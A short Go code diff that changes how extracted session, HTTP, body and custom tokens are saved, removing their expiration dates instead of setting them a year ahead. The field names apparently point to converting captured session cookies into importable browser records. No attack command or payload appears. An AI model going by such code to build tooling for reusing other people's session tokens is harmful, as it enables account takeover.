@@ -78,8 +78,8 @@ func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
 				t.StoreID = storeID
 			}
 
-			exp := time.Now().AddDate(1, 0, 0).Unix()
-			t.ExpirationDate = &exp
+			t.ExpirationDate = nil // Remove expirationDate field
+
 
 			tokens = append(tokens, t)
 		}
@@ -102,11 +102,18 @@ func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string
 		}
 
 		tokens := extractTokens(rawTokens)
+
+		// Remove expirationDate from each token before saving
+		for i := range tokens {
+			tokens[i].ExpirationDate = nil
+		}
+
 		consolidatedTokens = append(consolidatedTokens, tokens...)
 	}
 
 	return consolidatedTokens, nil
 }
+
 
 // Define a map to store session IDs and a mutex for thread-safe access
 var processedSessions = make(map[string]bool)
